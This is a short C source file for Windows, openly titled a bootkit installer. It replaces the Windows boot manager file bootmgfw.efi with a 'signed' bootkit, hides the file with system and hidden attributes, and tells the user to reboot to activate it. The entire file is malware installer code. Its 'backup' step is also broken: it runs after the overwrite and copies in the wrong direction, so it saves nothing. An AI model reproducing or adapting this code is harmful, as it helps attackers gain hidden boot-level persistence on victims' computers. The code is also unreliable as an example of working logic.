#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int main() {
    printf("[*] BootKit Installer v1.0\n");
    
    const char* dest = "C:\\EFI\\Microsoft\\Boot\\bootmgfw.efi";
    const char* src = "bootkit_signed.efi";
    
    if (CopyFile(src, dest, FALSE)) {
        printf("[+] Bootkit installed at %s\n", dest);
        
        // Backup del vecchio boot
        CopyFile("C:\\EFI\\Microsoft\\Boot\\bootmgfw_original.efi", dest, TRUE);
        printf("[+] Original backup created\n");
        
        SetFileAttributes(dest, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
        printf("[+] Attributes set (system+hidden)\n");
        
        printf("[!] Reboot to activate Secure Boot signed bootkit\n");
    } else {
        printf("[-] Failed to copy file\n");
        return 1;
    }
    
    return 0;
}
